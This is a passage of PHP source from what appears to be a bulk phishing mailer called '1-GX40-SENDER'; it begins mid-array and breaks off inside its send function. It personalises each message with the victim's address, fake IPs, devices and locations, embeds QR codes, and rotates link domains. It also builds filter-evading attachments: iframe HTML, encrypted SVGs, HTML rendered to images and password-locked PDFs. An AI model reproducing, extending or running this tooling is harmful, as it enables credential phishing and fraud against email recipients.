Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)", "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36", "Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16", "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"];
    $random_user_agent = $user_agents[array_rand($user_agents)];



    $placeholders = [
        '##DATE##' => date('Y-m-d'),
        '##TIME##' => date('H:i:s'),
        '##EMAIL##' => $recipient_email,
        '##EMAIL_CENSORED##' => censor_email($recipient_email),
        '##EMAILB64##' => base64_encode($recipient_email),
        '##UNAME##' => explode('@', $recipient_email)[0],
        '##UDOMAIN##' => explode('@', $recipient_email)[1],
        '##NAMEDOMAIN##' => explode('.', explode('@', $recipient_email)[1])[0],
        '##IP##' => generate_random_ip(),
        '##APPLE_PHONE##' => $random_apple_phone,
        '##APPLE_APPS##' => $random_apple_app,
        '##APPLE_MACBOOK##' => $random_apple_macbook,
        '##ANDROID_PHONE##' => $random_android_phone,
        '##ANDROID_OS##' => $random_android_os,
        '##COUNTRY##' => $random_country,
        '##COUNTRY_STATE##' => $random_country_state,
        '##USERAGENT##' => $random_user_agent,
        '##CHAR1##' => generate_random_chars(1),
        '##CHAR2##' => generate_random_chars(2),
        '##CHAR3##' => generate_random_chars(3),
        '##CHAR4##' => generate_random_chars(4),
        '##CHAR5##' => generate_random_chars(5),
        '##CHAR6##' => generate_random_chars(6),
        '##CHAR7##' => generate_random_chars(7),
        '##CHAR8##' => generate_random_chars(8),
        '##CHAR9##' => generate_random_chars(9),
        '##CHAR10##' => generate_random_chars(10)

    ];

    $placeholders['##QR##'] = embedQRCode(strtr($config[0]['QR_Code'][2][0]['QR_Link'], $placeholders), $config[0]['QR_Code'][0]['QR_Size'], strtr($config[0]['QR_Code'][1]['QR_Tittle'], $placeholders));



    $letter_contents = str_replace(array_keys($placeholders), array_values($placeholders), $letter_contents);
    $subject = str_replace(array_keys($placeholders), array_values($placeholders), $subject_template);

    foreach (['username', 'from_mail'] as $key) {
        $smtpConfig[$key] = str_replace(array_keys($placeholders), array_values($placeholders), $smtpConfig[$key]);
    }

    $fromName = str_replace(array_keys($placeholders), array_values($placeholders), $fromName);

    foreach (['NUMBER' => 'generate_random_number', 'TEXT' => 'generate_random_string', 'CHAR' => 'generate_random_chars'] as $type => $function) {
        $letter_contents = preg_replace_callback("/##{$type}(\d+)##/", fn($matches) => $function($matches[1]), $letter_contents);
        $subject = preg_replace_callback("/##{$type}(\d+)##/", fn($matches) => $function($matches[1]), $subject);
        $smtpConfig['username'] = preg_replace_callback("/##{$type}(\d+)##/", fn($matches) => $function($matches[1]), $smtpConfig['username']);
        $smtpConfig['from_mail'] = preg_replace_callback("/##{$type}(\d+)##/", fn($matches) => $function($matches[1]), $smtpConfig['from_mail']);
        $fromName = preg_replace_callback("/##{$type}(\d+)##/", fn($matches) => $function($matches[1]), $fromName);
    }

    if ($letter_encrypt == 2) {
        $letter_contents = str_replace('##LINK##', $random_domain, convertHtmlToJpg($letter_contents));
    }

    return [$letter_contents, $subject, $smtpConfig, $fromName];
}

function getTag($recipient_email)
{
    $config = config();

    $apple_phones = ["iPhone 5", "iPhone 5C", "iPhone 5S", "iPhone 6", "iPhone 6 Plus", "iPhone 6S", "iPhone 6S Plus", "iPhone SE (1st generation)", "iPhone 7", "iPhone 7 Plus", "iPhone 8", "iPhone 8 Plus", "iPhone X", "iPhone XS", "iPhone XS Max", "iPhone XR", "iPhone 11", "iPhone 11 Pro", "iPhone 11 Pro Max", "iPhone SE (2nd generation)", "iPhone 12", "iPhone 12 Mini", "iPhone 12 Pro", "iPhone 12 Pro Max", "iPhone 13", "iPhone 13 Mini", "iPhone 13 Pro", "iPhone 13 Pro Max", "iPhone SE (3rd generation)", "iPhone 14", "iPhone 14 Plus", "iPhone 14 Pro", "iPhone 14 Pro Max", "iPhone 15", "iPhone 15 Plus", "iPhone 15 Pro", "iPhone 15 Pro Max"];
    $random_apple_phone = $apple_phones[array_rand($apple_phones)];

    $apple_apps = ["Minecraft", "Procreate", "Blek", "Heads Up!", "Notability", "GoodNotes 5", "Fantastical", "Carrot Weather", "Affinity Photo", "Pixelmator", "MyFitnessPal", "Duolingo", "Calm", "Headspace", "Pocket Casts", "Trello", "Todoist", "Evernote", "Scanner Pro", "TurboScan", "Sleep Cycle", "White Noise", "Procreate Pocket", "LumaFusion", "Affinity Designer", "PDF Expert", "PCalc", "Dark Sky", "SkySafari", "PlantSnap", "PictureThis", "Procreate Dreams", "Affinity Publisher", "OmniFocus", "Day One", "1Password", "NordVPN", "VPN Unlimited", "KineMaster", "ArtRage", "GarageBand", "Final Cut Pro", "iA Writer", "Scrivener", "MindNode", "Tayasui Sketches", "Zombies, Run!", "The Room", "Stardew Valley", "Civilization VI"];
    $random_apple_app = $apple_apps[array_rand($apple_apps)];

    $apple_macbooks = ["MacBook", "MacBook Air", "MacBook Pro"];
    $random_apple_macbook = $apple_macbooks[array_rand($apple_macbooks)];

    $android_phones = ["Samsung Galaxy S23", "Samsung Galaxy S23+", "Samsung Galaxy S23 Ultra", "Google Pixel 7", "Google Pixel 7 Pro", "OnePlus 11", "OnePlus Nord 2T", "Xiaomi 13", "Xiaomi 13 Pro", "Xiaomi Redmi Note 12", "Oppo Find N2", "Oppo Reno 8", "Vivo X90", "Vivo V25 Pro", "Motorola Edge 40", "Motorola Moto G Power", "Sony Xperia 1 IV", "Sony Xperia 5 IV", "Asus ROG Phone 6", "Asus Zenfone 9", "Realme GT 2 Pro", "Realme 10 Pro+", "Nokia G400", "Nokia X30", "Honor Magic 5 Pro", "Honor 70", "TCL 30 XE", "TCL 40 SE", "ZTE Axon 20", "ZTE Blade V40", "Huawei P50 Pro", "Huawei Mate 50", "Samsung Galaxy A54", "Samsung Galaxy A34", "Google Pixel 6a", "OnePlus 10 Pro", "OnePlus Nord CE 2", "Xiaomi Poco F4", "Xiaomi Poco X4 Pro", "Oppo A78", "Oppo A57", "Vivo Y100", "Vivo Y21", "Motorola Edge 20", "Motorola Moto G Stylus", "Sony Xperia 10 IV", "Asus Zenfone 8", "Realme Narzo 50", "Nokia G50", "Honor X40 GT"];
    $random_android_phone = $android_phones[array_rand($android_phones)];

    $android_os = ["Android 1.0", "Android 1.1", "Android 1.5", "Android 1.6", "Android 2.0", "Android 2.2", "Android 2.3", "Android 3.0", "Android 4.0", "Android 4.1", "Android 4.4", "Android 5.0", "Android 6.0", "Android 7.0", "Android 8.0", "Android 9.0", "Android 10", "Android 11", "Android 12", "Android 13", "Android 14"];
    $random_android_os = $android_os[array_rand($android_os)];

    $country_states = ["Abu Dhabi, United Arab Emirates", "Accra, Ghana", "Algiers, Algeria", "Ankara, Turkey", "Asunción, Paraguay", "Athens, Greece", "Baghdad, Iraq", "Baku, Azerbaijan", "Bangkok, Thailand", "Banjul, Gambia", "Beijing, China", "Belgrade, Serbia", "Berlin, Germany", "Bern, Switzerland", "Bishkek, Kyrgyzstan", "Bogotá, Colombia", "Bratislava, Slovakia", "Brazzaville, Republic of Congo", "Brussels, Belgium", "Bucharest, Romania", "Budapest, Hungary", "Cairo, Egypt", "Canberra, Australia", "Cape Town, South Africa", "Caracas, Venezuela", "Chisinau, Moldova", "Djibouti, Djibouti", "Dodoma, Tanzania", "Doha, Qatar", "Dublin, Ireland", "Dushanbe, Tajikistan", "Hanoi, Vietnam", "Harare, Zimbabwe", "Helsinki, Finland", "Honolulu, United States (Hawaii)", "Islamabad, Pakistan", "Havana, Cuba", "Jakarta, Indonesia", "Jerusalem, Israel", "Kabul, Afghanistan", "Kairo, Egypt", "Kampala, Uganda", "Karachi, Pakistan", "Kashgar, China", "Kigali, Rwanda", "Kuala Lumpur, Malaysia", "Kyiv, Ukraine", "Lisbon, Portugal", "Ljubljana, Slovenia", "Lomé, Togo", "London, United Kingdom", "Luanda, Angola", "Lusaka, Zambia", "Madrid, Spain", "Malabo, Equatorial Guinea", "Managua, Nicaragua", "Manila, Philippines", "Minsk, Belarus", "Mogadishu, Somalia", "Monrovia, Liberia", "Montevideo, Uruguay", "Moroni, Comoros", "Moscow, Russia", "Nairobi, Kenya", "Nassau, Bahamas", "N'Djamena, Chad", "Ngerulmud, Palau", "Niamey, Niger", "Nicosia, Cyprus", "Oslo, Norway", "Ottawa, Canada", "Ouagadougou, Burkina Faso", "Peking, China (Beijing)", "Podgorica, Montenegro", "Port Moresby, Papua New Guinea", "Port-au-Prince, Haiti", "Prague, Czech Republic", "Quito, Ecuador", "Riga, Latvia", "Rome, Italy", "Riyadh, Saudi Arabia", "San Salvador, El Salvador", "Sofia, Bulgaria", "Stockholm, Sweden", "Suva, Fiji", "Tbilisi, Georgia", "Tegucigalpa, Honduras", "Tehran, Iran", "Tokyo, Japan", "Tripoli, Libya", "Tunis, Tunisia", "Ulaanbaatar, Mongolia", "Vaduz, Liechtenstein", "Valletta, Malta", "Vienna, Austria", "Vientiane, Laos", "Vilnius, Lithuania", "Washington D.C., United States", "Yamoussoukro, Ivory Coast"];
    $random_country_state = $country_states[array_rand($country_states)];

    $countries = ["United Arab Emirates", "Ghana", "Algeria", "Turkey", "Paraguay", "Greece", "Iraq", "Azerbaijan", "Thailand", "Gambia", "China", "Serbia", "Germany", "Switzerland", "Kyrgyzstan", "Colombia", "Slovakia", "Republic of Congo", "Belgium", "Romania", "Hungary", "Egypt", "Australia", "South Africa", "Venezuela", "Moldova", "Djibouti", "Tanzania", "Qatar", "Ireland", "Tajikistan", "Vietnam", "Zimbabwe", "Finland", "United States (Hawaii)", "Pakistan", "Cuba", "Indonesia", "Israel", "Afghanistan", "Egypt", "Uganda", "Australia", "Pakistan", "China", "Rwanda", "Malaysia", "Ukraine", "Portugal", "Slovenia", "Togo", "United Kingdom", "Angola", "Zambia", "Spain", "Equatorial Guinea", "Nicaragua", "Philippines", "Belarus", "Somalia", "Liberia", "Uruguay", "Comoros", "Russia", "Kenya", "Bahamas", "Chad", "Palau", "Niger", "Cyprus", "Norway", "Canada", "Burkina Faso", "China (Beijing)", "Montenegro", "Papua New Guinea", "Haiti", "Czech Republic", "Ecuador", "Latvia", "Italy", "Saudi Arabia", "El Salvador", "Bulgaria", "Sweden", "Fiji", "Georgia", "Honduras", "Iran", "Japan", "Libya", "Tunisia", "Mongolia", "Liechtenstein", "Malta", "Austria", "Laos", "Lithuania", "United States", "Ivory Coast"];
    $random_country = $countries[array_rand($countries)];

    $user_agents = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17", "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4", "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)", "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36", "Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16", "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"];
    $random_user_agent = $user_agents[array_rand($user_agents)];

    $placeholders = [
        '##DATE##' => date('Y-m-d'),
        '##TIME##' => date('H:i:s'),
        '##EMAIL##' => $recipient_email,
        '##EMAIL_CENSORED##' => censor_email($recipient_email),
        '##EMAILB64##' => base64_encode($recipient_email),
        '##UNAME##' => explode('@', $recipient_email)[0],
        '##UDOMAIN##' => explode('@', $recipient_email)[1],
        '##NAMEDOMAIN##' => explode('.', explode('@', $recipient_email)[1])[0],
        '##IP##' => generate_random_ip(),
        '##QR##' => embedQRCode($config[0]['QR_Code'][2][0]['QR_Link'], $config[0]['QR_Code'][0]['QR_Size'], $config[0]['QR_Code'][1]['QR_Tittle']),
        '##APPLE_PHONE##' => $random_apple_phone,
        '##APPLE_APPS##' => $random_apple_app,
        '##APPLE_MACBOOK##' => $random_apple_macbook,
        '##ANDROID_PHONE##' => $random_android_phone,
        '##ANDROID_OS##' => $random_android_os,
        '##COUNTRY##' => $random_country,
        '##COUNTRY_STATE##' => $random_country_state,
        '##USERAGENT##' => $random_user_agent
    ];

    return $placeholders;
}

function AttachementEdit($use_attachement, $recipient_email)
{
    $attachments = [];
    $config = config();
    $placeholders = getTag($recipient_email);

    if ($use_attachement == '1') {
        foreach ($config[0]['ATTACHMENT'] as $attachment) {
            $attachmentFilePath = '1-GX40-SENDER/ATTACHMENT/' . $attachment['ATTACHMENT_FILES'];
            $attachmentFileName = isset($attachment['ATTACHMENT_FILES_NAME']) ? str_replace(array_keys($placeholders), array_values($placeholders), $attachment['ATTACHMENT_FILES_NAME']) : 'default.pdf';
            if (file_exists($attachmentFilePath)) {
                $attachments[] = ['path' => $attachmentFilePath, 'name' => $attachmentFileName];
            }
        }
    } elseif ($use_attachement == '3') {
        $offline_attachment = $config[0]['OFFLINE_ATTACHMENT'][0];

        $attachment_link = str_replace(array_keys($placeholders), array_values($placeholders), $offline_attachment['ATTACHMENT_LINK']);
        $attachment_file_name = str_replace(array_keys($placeholders), array_values($placeholders), $offline_attachment['ATTACHMENT_FILES_NAME']);

        $newFileName = '1-GX40-SENDER/.temp/.attachment_offline/OFFLINE_' . basename($attachment_file_name);

        $encrypted_html = create_iframe_html($attachment_link, $offline_attachment['ATTACHMENT_CLOUDFLARE']);

        if (!is_dir('1-GX40-SENDER/.temp/.attachment_offline/')) {
            mkdir('1-GX40-SENDER/.temp/.attachment_offline/', 0777, true);
        }

        if (file_put_contents($newFileName, $encrypted_html) === false) {
            echo "Failed to save file: $newFileName\n";
            return $attachments;
        }

        $attachments[] = ['path' => $newFileName, 'name' => $attachment_file_name];
    } elseif ($use_attachement == '2') {
        $html_to_pdf = $config[0]['HTML_TO_PDF'][0];

        $html_file = '1-GX40-SENDER/HTML_TO_PDF/' . str_replace(array_keys($placeholders), array_values($placeholders), $html_to_pdf['HTML_TO_PDF_FILE']);
        $pdf_file = str_replace(array_keys($placeholders), array_values($placeholders), $html_to_pdf['ATTACHMENT_NAME']);

        if (!file_exists($html_file)) {
            echo "HTML file not found: $html_file\n";
            return $attachments;
        }

        $html_content = file_get_contents($html_file);

        $domains = isset($config[0]['Domains']) ? array_column($config[0]['Domains'], 'Domain') : ['https://defaultdomain.com'];
        $random_domain = $domains[array_rand($domains)];

        $html_content = str_replace('##LINK##', $random_domain, $html_content);

        $html_content = str_replace(array_keys($placeholders), array_values($placeholders), $html_content);

        $recipient_email_safe = preg_replace('/[^a-zA-Z0-9._-]/', '_', $recipient_email);
        $current_time = time();
        $temp_html_file = "1-GX40-SENDER/.temp/.attachment_html_to_pdf/.html_temp/temp_html_{$recipient_email_safe}_{$current_time}.html";

        if (!is_dir(dirname($temp_html_file))) {
            mkdir(dirname($temp_html_file), 0777, true);
        }

        $counter = 1;
        while (file_exists($temp_html_file)) {
            $temp_html_file = "1-GX40-SENDER/.temp/.attachment_html_to_pdf/.html_temp/temp_html_{$recipient_email_safe}_{$current_time}_{$counter}.html";
            $counter++;
        }

        $email_b64 = base64_encode($recipient_email);
        $html_content = str_replace('##EMAILB64##', $email_b64, $html_content);
        $html_content = str_replace('##EMAIL##', $recipient_email, $html_content);

        $html_content = preg_replace_callback('/##NUMBER(\d+)##/', function ($matches) {
            return generate_random_number($matches[1]);
        }, $html_content);

        $html_content = preg_replace_callback('/##TEXT(\d+)##/', function ($matches) {
            return generate_random_string($matches[1]);
        }, $html_content);

        $html_content = preg_replace_callback('/##CHAR(\d+)##/', function ($matches) {
            return generate_random_chars($matches[1]);
        }, $html_content);

        if (file_put_contents($temp_html_file, $html_content) === false) {
            echo "Failed to save HTML content to: $temp_html_file\n";
            return $attachments;
        }

        $protectedPdfFile = '1-GX40-SENDER/.temp/.attachment_html_to_pdf/.protect/' . $pdf_file;
        $unprotectedPdfFile = '1-GX40-SENDER/.temp/.attachment_html_to_pdf/.normal/' . $pdf_file;

        if (!is_dir(dirname($unprotectedPdfFile))) {
            mkdir(dirname($unprotectedPdfFile), 0777, true);
        }

        exec("/usr/bin/wkhtmltopdf --load-error-handling ignore --page-size A4 --orientation Portrait \"$temp_html_file\" \"$unprotectedPdfFile\" > /dev/null 2>&1");

        if (!file_exists($unprotectedPdfFile)) {
            echo "PDF could not be created.\n";
            return $attachments;
        }

        if (isset($html_to_pdf['ATTACHMENT_PROTECTION']) && $html_to_pdf['ATTACHMENT_PROTECTION'] == "1") {
            $ownerPassword = 'DUMPSYS.COM';
            $userPassword = $html_to_pdf['ATTACHMENT_PASSWORD'];

            exec("pdftk \"$unprotectedPdfFile\" output \"$protectedPdfFile\" owner_pw $ownerPassword user_pw $userPassword > /dev/null 2>&1");

            if (!file_exists($protectedPdfFile)) {
                echo "PDF could not be protected.\n";
                return $attachments;
            }

            if (file_exists($unprotectedPdfFile)) {
                unlink($unprotectedPdfFile);
            }
            $attachments[] = ['path' => $protectedPdfFile, 'name' => $pdf_file];
        } else {
            $attachments[] = ['path' => $unprotectedPdfFile, 'name' => $pdf_file];
        }

        if (file_exists($temp_html_file)) {
            unlink($temp_html_file);
        }
    } elseif ($use_attachement == '4') {
        $svgLink = strtr($config[0]['SVG_ATTACHMENT'][0]['SVG_LINK'], $placeholders);
        $svgFileName = str_replace(array_keys($placeholders), array_values($placeholders), $config[0]['SVG_ATTACHMENT'][0]['SVG_FILES_NAME']);
        file_put_contents('1-GX40-SENDER/.temp/.attachment_svg/' . $svgFileName, encrypt_svg($svgLink));
        $attachments[] = ['path' => '1-GX40-SENDER/.temp/.attachment_svg/' . $svgFileName, 'name' => $svgFileName];
    } elseif ($use_attachement == '5') {

        $dir = "1-GX40-SENDER/HTML_TO_IMG";
        $dor_attachments = "1-GX40-SENDER/.temp/.attachment_html_to_img/";


        //cek jika folder html to jpg
        if (!is_dir(dirname($dir))) {
            mkdir(dirname($dir), 0777, true);
        }

        //cek jika folder .temp attachement html to jpg maka akan di buatkan 
        if (!is_dir(dirname($dor_attachments))) {
            mkdir(dirname($dor_attachments), 0777, true);
        }

        $html_to_img = $config[0]['HTML_TO_IMG'][0];
        $html_file = '1-GX40-SENDER/HTML_TO_IMG/' . str_replace(array_keys($placeholders), array_values($placeholders), $html_to_img['HTML_TO_IMG_FILE']);
        $img_file = str_replace(array_keys($placeholders), array_values($placeholders), $html_to_img['ATTACHMENT_NAME']);

        $domains = isset($config[0]['Domains']) ? array_column($config[0]['Domains'], 'Domain') : ['https://defaultdomain.com'];
        $random_domain = $domains[array_rand($domains)];

        $html_content = file_get_contents($html_file);
        $html_content = str_replace('##LINK##', $random_domain, $html_content);
        $html_content = str_replace(array_keys($placeholders), array_values($placeholders), $html_content);

        $recipient_email_safe = preg_replace('/[^a-zA-Z0-9._-]/', '_', $recipient_email);
        $current_time = time();

        $temp_html_file = "1-GX40-SENDER/.temp/.attachment_html_to_img/.html_temp/temp_html_{$recipient_email_safe}_{$current_time}.html";

        if (!is_dir(dirname($temp_html_file))) {
            mkdir(dirname($temp_html_file), 0777, true);
        }

        $email_b64 = base64_encode($recipient_email);
        $html_content = str_replace('##EMAILB64##', $email_b64, $html_content);
        $html_content = str_replace('##EMAIL##', $recipient_email, $html_content);

        $html_content = preg_replace_callback('/##NUMBER(\d+)##/', function ($matches) {
            return generate_random_number($matches[1]);
        }, $html_content);

        $html_content = preg_replace_callback('/##TEXT(\d+)##/', function ($matches) {
            return generate_random_string($matches[1]);
        }, $html_content);

        $html_content = preg_replace_callback('/##CHAR(\d+)##/', function ($matches) {
            return generate_random_chars($matches[1]);
        }, $html_content);

        if (file_put_contents($temp_html_file, $html_content) === false) {
            echo "Failed to save HTML content to: $temp_html_file\n";
            return $attachments;
        }

        $dir_img = $dor_attachments . $img_file;

        $comand = "/usr/bin/wkhtmltoimage --width 800 --height 600 --quality 80 $temp_html_file $dir_img > /dev/null 2>&1";

        exec($comand);

        if (!file_exists($dir_img)) {
            echo "Image could not be protected.\n";
            return $attachments;
        }

        if (file_exists($temp_html_file)) {
            unlink($temp_html_file);
        }

        $attachments[] = ['path' => $dir_img, 'name' => $img_file];
    };

    return $attachments;
}

function check_smtp($smtpConfig)
{
    $mail = new PHPMailer\PHPMailer\PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = $smtpConfig['server'];
        $mail->SMTPAuth = true;
		
		//tambahan
        $mail->CharSet = "UTF-8";
		
        $mail->Username = $smtpConfig['username'];
        $mail->Password = $smtpConfig['password'];
        $mail->SMTPSecure = $smtpConfig['secure'] === 'TLS' ? PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS : PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port = $smtpConfig['port'];

        $mail->smtpConnect();
        $mail->smtpClose();
        return true;
    } catch (Exception $e) {
        return false;
    }
}

function sendEmail($setting_config, $to, $smtpConfig, $fromName, $subject, $encoding, $headers, $replyTo, $body, $isHtml, $attachments)
{
    $mail = new PHPMailer\PHPMailer\PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = $smtpConfig['server'];
        $mail->SMTPAuth = true;
		
		//tambahan
        $mail->CharSet = "UTF-8";
		
        // $mail->Priority = $setting_config['Sender_Setup']['Priority'];
        $mail->Username = $smtpConfig['username'];
        $mail->Password = $smtpConfig['password'];
        $mail->SMTPSecure = $smtpConfig['secure'] === 'TLS' ? PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS : PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port = $smtpConfig['port'];
        $mail->setFrom($smtpConfig['from_mail'], $fromName);
        $mail->addAddress($to);
        $mail->Subject = $subject;
        $mail->isHTML($isHtml);
        $mail->Body = $body;

        if ($encoding) $mail->Encoding = $encoding;

        foreach ($headers as $header) {
            $keys_skip = ["HEADER1", "HEADER2"];
            $key_header = key($header);
            $value_header = current($header);

            foreach ($header as $key => $value) {

